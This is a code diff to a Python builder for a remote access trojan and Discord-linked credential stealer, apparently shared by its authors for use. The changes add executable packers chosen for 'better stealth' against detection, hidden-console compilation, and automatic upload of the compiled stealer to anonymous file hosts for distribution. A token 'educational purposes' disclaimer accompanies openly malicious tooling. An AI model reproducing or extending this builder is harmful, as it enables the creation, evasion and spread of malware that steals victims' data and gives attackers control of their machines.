@@ -1,3 +1,4 @@
+# Added ALOT more shit 
 import hashlib
 import os
 import random
@@ -14,26 +15,65 @@ init()
 def print_banner():
     """Print the application banner."""
     banner = f"""
-    {Fore.RED}╔═══════════════════════════════════════════════════════════════════════╗
-    ║ {Fore.CYAN}███████╗██╗  ██╗ ██████╗ ████████╗██╗ ██████╗ █████╗ ██╗     ██╗  ██╗{Fore.RED} ║
-    ║ {Fore.CYAN}██╔════╝╚██╗██╔╝██╔═══██╗╚══██╔══╝██║██╔════╝██╔══██╗██║     ╚██╗██╔╝{Fore.RED} ║
-    ║ {Fore.CYAN}█████╗   ╚███╔╝ ██║   ██║   ██║   ██║██║     ███████║██║      ╚███╔╝ {Fore.RED} ║
-    ║ {Fore.CYAN}██╔══╝   ██╔██╗ ██║   ██║   ██║   ██║██║     ██╔══██║██║      ██╔██╗ {Fore.RED} ║
-    ║ {Fore.CYAN}███████╗██╔╝ ██╗╚██████╔╝   ██║   ██║╚██████╗██║  ██║███████╗██╔╝ ██╗{Fore.RED} ║
-    ║ {Fore.CYAN}╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{Fore.RED} ║
-    ║                                                                       ║
-    ║ {Fore.GREEN}Exotically Flexing RAT Builder                                       {Fore.RED} ║
-    ║ {Fore.YELLOW}Created by: dead exotic & hoa                                        {Fore.RED} ║
-    ║ {Fore.CYAN}https://github.com/deadexotic                                        {Fore.RED} ║
-    ╚═══════════════════════════════════════════════════════════════════════╝
+    {Fore.MAGENTA}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
+    {Fore.MAGENTA}┃  {Fore.CYAN}⋆｡°✩ {Fore.YELLOW}Exotically Flexing RAT Builder{Fore.CYAN} ✩°｡⋆     {Fore.MAGENTA}                              ┃
+    {Fore.MAGENTA}┃                                                                             ┃
+    {Fore.MAGENTA}┃  {Fore.CYAN}ₓ˚. ୭ ˚○◦˚.˚◦○˚ ୧ .˚ₓ{Fore.MAGENTA}                                                      ┃
+    {Fore.MAGENTA}┃                                                                             ┃
+    {Fore.MAGENTA}┃  {Fore.CYAN}(/ /)     {Fore.YELLOW}Created with love by{Fore.MAGENTA}                                             ┃
+    {Fore.MAGENTA}┃  {Fore.CYAN}(^.^)     {Fore.YELLOW}dead exotic & hoa{Fore.MAGENTA}                                                ┃ 
+    {Fore.CYAN}┃  c(")(")   {Fore.YELLOW}https://github.com/deadexotic{Fore.MAGENTA}                                    ┃
+    {Fore.MAGENTA}┃                                                                             ┃
+    {Fore.MAGENTA}┃  {Fore.CYAN}✿ {Fore.CYAN}Features:{Fore.CYAN} ✿ {Fore.MAGENTA}                                                             ┃
+    {Fore.MAGENTA}┃  {Fore.YELLOW}❀ Remote Access Control                                                    {Fore.MAGENTA}┃
+    {Fore.MAGENTA}┃  {Fore.YELLOW}❀ Discord Integration                                                      {Fore.MAGENTA}┃
+    {Fore.MAGENTA}┃  {Fore.YELLOW}❀ Stealer Capabilities                                                     {Fore.MAGENTA}┃
+    {Fore.MAGENTA}┃  {Fore.YELLOW}❀ Custom Icon Support                                                      {Fore.MAGENTA}┃
+    {Fore.MAGENTA}┃                                                                             ┃
+    {Fore.MAGENTA}┃  {Fore.CYAN}(◡ ω ◡){Fore.MAGENTA}                                                                    ┃
+    {Fore.MAGENTA}┃                                                                             ┃
+    {Fore.MAGENTA}┃  {Fore.CYAN}✧･ﾟ: *✧･ﾟ:* {Fore.YELLOW}Let's build something amazing!{Fore.CYAN} *:･ﾟ✧*:･ﾟ✧{Fore.MAGENTA}                      ┃
+    {Fore.MAGENTA}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
     """
     print(banner)
-
 def check_requirements():
     """Check and install required modules if needed."""
-    required_modules = ['discord.py', 'pycaw', 'comtypes', 'requests', 'pyinstaller', 'colorama', 'ctypes', 'mss', 'pynput']
+    required_modules = [
+        'discord.py>=2.3.2',
+        'pycaw>=20230407',
+        'comtypes>=1.2.0', 
+        'requests>=2.31.0',
+        'pyinstaller>=6.1.0',
+        'colorama>=0.4.6',
+        'mss>=9.0.1',
+        'pynput>=1.7.6',
+        'pyautogui>=0.9.54',
+        'browserhistory>=0.1.3',
+        'pywin32>=306',
+        'winreg',
+        'urllib3>=2.1.0',
+        'pillow>=10.1.0',
+        'psutil>=5.9.6',
+        'cryptography>=41.0.5',
+        'opencv-python>=4.8.1.78',
+        'pyperclip>=1.8.2',
+        'win32gui',
+        'win32con',
+        'win32process',
+        'pycaw>=20230407',
+        'socket',
+        'asyncio',
+        'json',
+        'base64',
+        're',
+        'shutil',
+        'platform',
+        'threading',
+        'subprocess',
+        'datetime',
+        'zipfile'
+    ]
     missing_modules = []
-    
     for module in required_modules:
         try:
             if module == 'discord.py':
@@ -44,16 +84,16 @@ def check_requirements():
             missing_modules.append(module)
     
     if missing_modules:
-        print(f"{Fore.RED}[!] Missing required modules: {', '.join(missing_modules)}")
-        install = input(f"{Fore.YELLOW}[?] Do you want to install them now? (y/n): {Style.RESET_ALL}")
+        print(f"{Fore.CYAN}[✿] Missing required modules: {', '.join(missing_modules)}")
+        install = input(f"{Fore.YELLOW}[❀] Would you like to install them now? (y/n): {Style.RESET_ALL}")
         if install.lower() == 'y':
             for module in missing_modules:
-                print(f"{Fore.CYAN}[*] Installing {module}...{Style.RESET_ALL}")
+                print(f"{Fore.CYAN}[✧] Installing {module}...{Style.RESET_ALL}")
                 subprocess.run([sys.executable, "-m", "pip", "install", module], check=False)
-            print(f"{Fore.GREEN}[+] All required modules installed successfully!{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}[✿] All modules installed successfully! {Fore.CYAN}(｡♥‿♥｡){Style.RESET_ALL}")
             return True
-        print(f"{Fore.RED}[!] Please install the required modules and try again.{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}[i] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
+        print(f"{Fore.RED}[✗] Please install the required modules and try again.{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[✧] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
         return False
     return True
 
@@ -157,6 +197,74 @@ def insert_token(token):
         print(f"{Fore.RED}[!] Error inserting token: {str(e)}{Style.RESET_ALL}")
         return False
 
+def install_packers():
+    """Install the necessary packers."""
+    print(f"{Fore.CYAN}[*] Checking for packers...{Style.RESET_ALL}")
+    
+    # Check for UPX
+    try:
+        subprocess.run(["upx", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
+        print(f"{Fore.GREEN}[+] UPX is already installed{Style.RESET_ALL}")
+    except:
+        print(f"{Fore.YELLOW}[!] UPX not found, installing...{Style.RESET_ALL}")
+        try:
+            if os.name == 'nt':
+                # Download UPX for Windows
+                url = "https://github.com/upx/upx/releases/download/v4.0.2/upx-4.0.2-win64.zip"
+                r = requests.get(url)
+                with open("upx.zip", "wb") as f:
+                    f.write(r.content)
+                shutil.unpack_archive("upx.zip")
+                os.remove("upx.zip")
+                # Add to PATH
+                os.environ["PATH"] += os.pathsep + os.path.abspath("upx-4.0.2-win64")
+            else:
+                # Install UPX using package manager
+                subprocess.run(["sudo", "apt-get", "install", "upx"], check=True)
+            print(f"{Fore.GREEN}[+] UPX installed successfully{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.RED}[!] Failed to install UPX: {str(e)}{Style.RESET_ALL}")
+
+    # Check for MPRESS
+    try:
+        subprocess.run(["mpress", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
+        print(f"{Fore.GREEN}[+] MPRESS is already installed{Style.RESET_ALL}")
+    except:
+        print(f"{Fore.YELLOW}[!] MPRESS not found, installing...{Style.RESET_ALL}")
+        try:
+            if os.name == 'nt':
+                # Download MPRESS
+                url = "https://www.matcode.com/mpress.219.zip"
+                r = requests.get(url)
+                with open("mpress.zip", "wb") as f:
+                    f.write(r.content)
+                shutil.unpack_archive("mpress.zip")
+                os.remove("mpress.zip")
+                # Add to PATH
+                os.environ["PATH"] += os.pathsep + os.path.abspath("mpress")
+                print(f"{Fore.GREEN}[+] MPRESS installed successfully{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.RED}[!] MPRESS is only available for Windows{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.RED}[!] Failed to install MPRESS: {str(e)}{Style.RESET_ALL}")
+
+def pack_executable(exe_path, packer=None):
+    """Pack the executable to make it smaller."""
+    if not packer:
+        return
+        
+    print(f"{Fore.CYAN}[*] Packing executable with {packer}...{Style.RESET_ALL}")
+    
+    try:
+        if packer == "upx":
+            print(f"{Fore.YELLOW}[!] Warning: UPX packing may increase detection rates{Style.RESET_ALL}")
+            subprocess.run(["upx", "--best", exe_path], check=True)
+        elif packer == "mpress":
+            subprocess.run(["mpress", "-s", exe_path], check=True)
+        print(f"{Fore.GREEN}[+] Executable packed successfully with {packer}!{Style.RESET_ALL}")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Failed to pack executable: {str(e)}{Style.RESET_ALL}")
+
 def insert_webhook(webhook):
     """Insert the webhook URL into the stealer source code."""
     if not webhook:
@@ -256,29 +364,83 @@ def compile_stealer(output_name):
             "stealer_source.py"
         ]
         
-        # Run PyInstaller
-        process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
-        
-        if process.returncode != 0:
-            print(f"{Fore.RED}[!] Stealer compilation failed: {process.stderr.decode()}{Style.RESET_ALL}")
-            return None
-        
+        # Run PyInstaller or Nuitka based on availability
+        try:
+            # Try Nuitka first
+            nuitka_cmd = [
+                "python", "-m", "nuitka",
+                "--mingw64",
+                "--windows-disable-console",
+                "--onefile",
+                "--remove-output",
+                "--assume-yes-for-downloads",
+                "--output-dir=dist",
+                "stealer_source.py"
+            ]
+            
+            process = subprocess.run(nuitka_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
+            
+            if process.returncode == 0:
+                print(f"{Fore.GREEN}[+] Successfully compiled with Nuitka{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.YELLOW}[!] Nuitka compilation failed, falling back to PyInstaller{Style.RESET_ALL}")
+                process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
+                
+                if process.returncode != 0:
+                    print(f"{Fore.RED}[!] Stealer compilation failed: {process.stderr.decode()}{Style.RESET_ALL}")
+                    return None
+
+        except Exception:
+            print(f"{Fore.YELLOW}[!] Nuitka not found, using PyInstaller{Style.RESET_ALL}")
+            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
+            
+            if process.returncode != 0:
+                print(f"{Fore.RED}[!] Stealer compilation failed: {process.stderr.decode()}{Style.RESET_ALL}")
+                return None
+
         # Check if the executable was created
         exe_path = os.path.join("dist", f"{stealer_output}.exe")
+        nuitka_exe = os.path.join("dist", "stealer_source.exe")
+        
+        if os.path.exists(nuitka_exe):
+            exe_path = nuitka_exe
+            shutil.move(nuitka_exe, os.path.join("dist", f"{stealer_output}.exe"))
+            
         if os.path.exists(exe_path):
             # Copy to current directory
             shutil.copy(exe_path, f"{stealer_output}.exe")
             print(f"{Fore.GREEN}[+] Stealer compiled successfully! Output: {stealer_output}.exe{Style.RESET_ALL}")
             
-            # Upload to 0x0.st
-            url = upload_to_0x0(f"{stealer_output}.exe")
+            # Upload to multiple file hosts
+            url = None
+            hosts = [
+                'https://0x0.st',
+                'https://transfer.sh',
+                'https://file.io'
+            ]
+            
+            for host in hosts:
+                try:
+                    with open(f"{stealer_output}.exe", 'rb') as f:
+                        if host == 'https://transfer.sh':
+                            response = requests.put(f'{host}/{stealer_output}.exe', data=f)
+                        else:
+                            response = requests.post(host, files={'file': f})
+                            
+                    if response.status_code == 200:
+                        url = response.text.strip()
+                        if url:
+                            print(f"{Fore.GREEN}[+] Stealer uploaded to: {url}{Style.RESET_ALL}")
+                            break
+                except:
+                    continue
+            
             if url:
-                print(f"{Fore.GREEN}[+] Stealer uploaded to: {url}{Style.RESET_ALL}")
                 return url
             else:
-                print(f"{Fore.RED}[!] Failed to upload stealer to 0x0.st{Style.RESET_ALL}")
+                print(f"{Fore.RED}[!] Failed to upload stealer to any file host{Style.RESET_ALL}")
                 return None
-        
+                
         print(f"{Fore.RED}[!] Stealer compilation completed but executable not found.{Style.RESET_ALL}")
         return None
             
@@ -290,6 +452,7 @@ def compile_stealer(output_name):
         try:
             shutil.rmtree("build", ignore_errors=True)
             shutil.rmtree("dist", ignore_errors=True)
+            shutil.rmtree("stealer_source.build", ignore_errors=True)
             if os.path.exists(f"{stealer_output}.spec"):
                 os.remove(f"{stealer_output}.spec")
             if os.path.exists("random_data_stealer.txt"):
@@ -324,7 +487,7 @@ def insert_stealer_link(link):
         print(f"{Fore.RED}[!] Error inserting stealer link: {str(e)}{Style.RESET_ALL}")
         return False
 
-def compile_rat(output_name, icon_path=None):
+def compile_rat(output_name, icon_path=None, packer=None):
     """Compile the RAT source code into an executable."""
     try:
         print(f"{Fore.CYAN}[*] Compiling RAT...{Style.RESET_ALL}")
@@ -370,6 +533,10 @@ def compile_rat(output_name, icon_path=None):
             shutil.copy(exe_path, f"{output_name}.exe")
             print(f"{Fore.GREEN}[+] RAT compiled successfully! Output: {output_name}.exe{Style.RESET_ALL}")
             
+            # Pack the executable if requested
+            if packer:
+                pack_executable(f"{output_name}.exe", packer)
+            
             # Clean up
             try:
                 shutil.rmtree("build", ignore_errors=True)
@@ -396,17 +563,17 @@ def main():
     """Main function to run the RAT builder."""
     print_banner()
     
-    print(f"{Fore.CYAN}[*] Checking requirements...{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}[✧] Checking requirements...{Style.RESET_ALL}")
     if not check_requirements():
         return
     
-    print(f"\n{Fore.YELLOW}[!] DISCLAIMER: This tool is for educational purposes only.{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}[!] The authors are not responsible for any misuse or damage caused by this program.{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}[!] By continuing, you agree that you will use this responsibly and legally.{Style.RESET_ALL}\n")
+    print(f"\n{Fore.YELLOW}[❀] DISCLAIMER: This tool is for educational purposes only.{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[❀] The authors are not responsible for any misuse or damage.{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[❀] By continuing, you agree to use this responsibly and legally.{Style.RESET_ALL}\n")
     
-    agree = input(f"{Fore.YELLOW}[?] Do you agree? (y/n): {Style.RESET_ALL}")
+    agree = input(f"{Fore.CYAN}[✿] Do you agree? (y/n): {Style.RESET_ALL}")
     if agree.lower() != 'y':
-        print(f"{Fore.RED}[!] Exiting...{Style.RESET_ALL}")
+        print(f"{Fore.RED}[✗] Exiting...{Style.RESET_ALL}")
         return
     
     # Get Discord bot token
@@ -428,6 +595,21 @@ def main():
     if icon_path and not os.path.exists(icon_path):
         print(f"{Fore.YELLOW}[!] Icon file not found, using default icon.{Style.RESET_ALL}")
         icon_path = None
+    
+    # Ask about packing
+    print(f"\n{Fore.CYAN}[*] Available packing options:{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[1] MPRESS (Recommended - Better stealth){Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[2] UPX (Not recommended - Higher detection rate){Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[3] No packing{Style.RESET_ALL}")
+    
+    packer_choice = input(f"{Fore.YELLOW}[?] Choose packing option (1-3): {Style.RESET_ALL}")
+    packer = None
+    if packer_choice == "1":
+        packer = "mpress"
+        install_packers()
+    elif packer_choice == "2":
+        packer = "upx"
+        install_packers()
     
     # Download RAT source
     if not download_rat_source():
@@ -453,7 +635,7 @@ def main():
                     insert_stealer_link(stealer_link)
     
     # Compile RAT
-    if not compile_rat(output_name, icon_path):
+    if not compile_rat(output_name, icon_path, packer):
         print(f"{Fore.YELLOW}[i] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
         return
     
